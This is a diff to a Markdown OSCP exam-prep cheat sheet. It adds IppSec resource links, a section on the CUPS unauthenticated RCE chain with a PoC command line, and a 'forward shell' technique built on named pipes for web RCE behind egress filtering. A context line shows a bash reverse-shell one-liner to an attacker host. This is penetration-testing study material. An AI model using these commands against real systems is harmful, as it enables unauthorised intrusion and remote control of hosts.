@@ -1714,7 +1714,7 @@ A hypothesis has: a **claim**, a **test**, and a **timebox**. No timebox = rabbi
 ## Who to learn from — and their distinct edge
 | Creator | Go to them for |
 |---|---|
-| **IppSec** | video walkthrough of (almost) every retired HTB box — enum-first methodology; the TJ_Null answer key |
+| **IppSec** | video walkthrough of nearly every retired HTB box; **search by technique at `ippsec.rocks`** → jumps to the exact video + timestamp. Also `github.com/ippsec` (see `[SHELL-FORWARD]`) |
 | **0xdf** | *written* HTB walkthroughs — great for **unintended paths** and comparing your approach |
 | **Tib3rius** | **the** Linux & Windows **privilege-escalation** courses; AutoRecon; privesc-checker scripts |
 | **TCM / Heath Adams** | **AD & internal** methodology (Practical Ethical Hacking), pivoting — the parts OSCP historically skipped |
@@ -1735,7 +1735,7 @@ A hypothesis has: a **claim**, a **test**, and a **timebox**. No timebox = rabbi
 - **The AD set can fall to `nxc` + `ligolo` almost alone.** NetExec harvests creds and enumerates across every protocol; Ligolo handles the pivot. You rarely need more for the 40 points — lean on them and don't over-tool.
 - **⚠️ Bigger checklist = bigger rabbit-hole risk.** (Straight from a passer.) The more techniques you *could* try, the more tempting it is to grind them all until something works. **Enumerate to decide the *right* one** — don't blindly walk the whole list.
 
-**Sources:** [awesome-oscp resource list](https://github.com/0x4d31/awesome-oscp) · [Tib3rius — 59 Hosts to Glory / AutoRecon](https://medium.com/@Tib3rius/59-hosts-to-glory-passing-the-oscp-acf0fd384371) · [0xdf — OffSec / HTB lists](https://0xdf.gitlab.io/cheatsheets/offsec) · [hackwithmike OSCP methodology](https://hackwithmike.gitbook.io/oscp/methodology/oscp-methodology) · [Emmanuel Solis OSCP notes (very complete + well organised)](https://www.emmanuelsolis.com/oscp.html) · [muqaram0 cheatsheet](https://muqaram0.github.io/cheatsheet/oscp-cheatsheet/) + [tools list](https://muqaram0.github.io/tools/) (shared on r/oscp) · community OSCP-prep guides. Curated + cross-checked against this KB — not transcribed per-video; verify commands against your installed tools.
+**Sources:** [awesome-oscp resource list](https://github.com/0x4d31/awesome-oscp) · [IppSec video search — ippsec.rocks](https://ippsec.rocks) · [IppSec GitHub (forward-shell, etc.)](https://github.com/ippsec) · [Tib3rius — 59 Hosts to Glory / AutoRecon](https://medium.com/@Tib3rius/59-hosts-to-glory-passing-the-oscp-acf0fd384371) · [0xdf — OffSec / HTB lists](https://0xdf.gitlab.io/cheatsheets/offsec) · [hackwithmike OSCP methodology](https://hackwithmike.gitbook.io/oscp/methodology/oscp-methodology) · [Emmanuel Solis OSCP notes (very complete + well organised)](https://www.emmanuelsolis.com/oscp.html) · [muqaram0 cheatsheet](https://muqaram0.github.io/cheatsheet/oscp-cheatsheet/) + [tools list](https://muqaram0.github.io/tools/) (shared on r/oscp) · community OSCP-prep guides. Curated + cross-checked against this KB — not transcribed per-video; verify commands against your installed tools.
 
 ---
 
@@ -2211,6 +2211,7 @@ When nmap comes back, don't panic at the list — recognise each port and reach 
 | 161 (UDP) | SNMP | device monitoring | `snmpwalk -c public` → **creds in process args** (easy win) | `[ENUM-SNMP]` |
 | 389/636/3268 | LDAP | the AD directory | anonymous bind dump; passwords hide in `description` | `[ENUM-LDAP]` |
 | 623 (UDP) | IPMI | server management | dump the **pre-auth hash** → crack it | `[ENUM-IPMI]` |
+| 631 | CUPS/IPP | Linux printing | CVE-2024-4717x → unauth RCE (niche/recent) | `[ENUM-CUPS]` |
 | 1433 | MSSQL | MS SQL Server database | creds → `xp_cmdshell` **RCE** | `[ENUM-MSSQL]` |
 | 1521 | Oracle | Oracle database | SID-guess → default creds (`scott/tiger`) → RCE | `[ENUM-ORACLE]` |
 | 2049 | NFS | Unix file shares | mount it; **`no_root_squash`** → root | `[ENUM-NFS]` |
@@ -2552,6 +2553,15 @@ python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI>/443 
 ```
 **Gotcha:** `--exec` is **blind** (it schedules the job, shows no output) → use **`--read`** for files, or `--exec` a **reverse shell** to see results. **Leads to:** root (first box: PG **Twiggy**).
 
+## [ENUM-CUPS]  Port 631 (+ 5353/UDP mDNS) — CUPS (Linux printing)
+**What it is:** the Linux printing service (IPP). The late-2024 bug chain **CVE-2024-47176 / -47177 / -47076 / -47175** → **unauthenticated RCE**: a crafted IPP request makes `cups-browsed` add an attacker-controlled "printer", and sending a print job to it runs your command.
+```bash
+nmap -p631 -sCV $IP                  # CUPS/IPP ; also browse http://$IP:631 in a browser
+# PoC (IppSec's): https://github.com/ippsec/evil-cups
+#   python3 evil-cups.py <KALI-IP> $IP "<command>"     # sets up the rogue printer + payload, triggers it
+```
+**Note:** real + recent, but **rare on current OSCP** — know it exists, don't expect it. **Leads to:** RCE in the printing context.
+
 ## [ENUM-UNUSUAL-PORTS]  a generic method for any port you don't recognise
 When you meet an unknown port, work through these:
 1. `nc -nv $IP <port>` → grab the banner; try sending a newline, then `HELP`, then `GET / HTTP/1.0`.
@@ -2578,6 +2588,7 @@ Use your Nmap results, then jump (Ctrl+F the tag):
 161 SNMP       → snmpwalk → [ENUM-SNMP]
 389/636/3268 LDAP → [ENUM-LDAP] + [AD-ENUM]
 623 IPMI       → [ENUM-IPMI]  (UDP — dump the hash)
+631 CUPS/IPP   → [ENUM-CUPS]  (Linux printing — CVE-2024-4717x RCE, niche)
 1433 MSSQL     → [ENUM-MSSQL]
 1521 Oracle    → [ENUM-ORACLE]
 2049 NFS       → [ENUM-NFS]
@@ -3133,6 +3144,19 @@ Alternatives: `script -qc /bin/bash /dev/null`; or full `socat` TTY if socat is 
 10. Still nothing?                                        → tcpdump -i tun0 port 443   (do you even see the SYN?)
 ```
 Most common, in order: **wrong LHOST (used eth0 instead of tun0)**, listener not running, blocked port, quoting/encoding, AV.
+
+## [SHELL-FORWARD]  web RCE but outbound is BLOCKED → a "forward shell" (IppSec)
+**The problem:** you have a **web RCE** (a webshell / `?cmd=` / blind command exec) but a reverse shell never connects back — the target's **outbound is firewalled** (and bind shells are blocked inbound too). You can run one-off commands, but you have no interactive shell.
+**The trick (IppSec's forward-shell):** you don't need a socket at all. On the target you set up a **named pipe (FIFO)**: a background shell *reads commands from the FIFO* and *writes their output to a file*. You then drive it entirely **over the same web RCE** — send each command by writing to the FIFO, read the result by fetching the output file. Result: a fully interactive, PTY-ish shell carried over nothing but your existing HTTP RCE — **zero outbound/inbound connection.**
+```bash
+# the core idea (run these THROUGH your web RCE, e.g. ?cmd=...):
+mkfifo /tmp/in; tail -f /tmp/in | /bin/bash 2>&1 > /tmp/out &
+#   send a command:   echo "id" > /tmp/in        (via ?cmd=)
+#   read the output:  cat /tmp/out               (via ?cmd=, or fetch the file)
+# IppSec's ready-made driver (automates the send/read loop over your RCE):
+#   https://github.com/ippsec/forward-shell   ← EDIT it for your target (it's hardcoded for Shellshock)
+```
+**When to reach for it:** an egress-filtered box where `[REVERSE-SHELL-NOT-CONNECTING]` step 8 ("all outbound blocked") applies and you only have a web RCE. **Note:** the script must be edited to match *how* your RCE delivers commands — understand the FIFO mechanism, don't run it blind.
 
 ---
 
